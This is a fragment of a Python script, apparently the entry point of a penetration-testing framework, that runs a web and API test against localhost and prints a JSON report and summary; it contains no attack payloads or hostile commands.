    
    try:
        # Initialize framework
        await framework.initialize()
        
        # Contoh konfigurasi target
        target_config = {
            "url": "http://localhost:8000",
            "test_types": ["web", "api"],
            "depth": "comprehensive"
        }
        
        print("Starting penetration test...")
        report = await framework.run_comprehensive_test(target_config)
        
        # Export report
        json_report = framework.export_report(report, "json")
        print(f"\nPenetration Test Report (JSON):")
        print(json_report)
        
        # Show summary
        print(f"\n=== PENETRATION TEST SUMMARY ===")
        print(f"Report ID: {report.report_id}")
        print(f"Target: {report.target_url}")
        print(f"Risk Level: {report.risk_level}")
        print(f"Overall Score: {report.overall_score:.1f}/100")
        print(f"Vulnerabilities Found: {len([r for r in report.results if r.success])}")
        
    except Exception as e:
        print(f"Error: {e}")
    
    finally:
        await framework.cleanup()

if __name__ == "__main__":
    # Run the async main function
    asyncio.run(main())